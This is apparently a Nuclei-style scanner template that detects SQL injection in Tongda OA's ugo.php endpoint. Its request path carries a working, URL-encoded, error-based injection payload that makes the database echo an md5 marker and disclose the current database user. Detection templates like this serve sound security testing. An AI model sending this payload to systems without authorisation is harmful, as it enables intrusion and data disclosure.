id: poc-yaml-tongda-interface-ugo-sqli
info:
  name: Tongda OA ugo.php SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
variables:
  t1: "{{rand_int(1000,10000)}}"
  t2: "{{md5(t1)}}"
http:
  - method: GET
    path:
      - "/interface/ugo.php?OA_USER=a%2527%20and%201=(select%201%20from(select%20count(*),concat((select%20md5({{t1}})),0x7c,user(),0x7c,floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x%20limit%200,1)a)%20and%20%25271%2527=%25271"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "请联系管理员"
        condition: or
        part: body
      - type: word
        words:
          - "错误"
        condition: or
        part: body
      - type: word
        words:
          - "{{t2}}"
        part: body
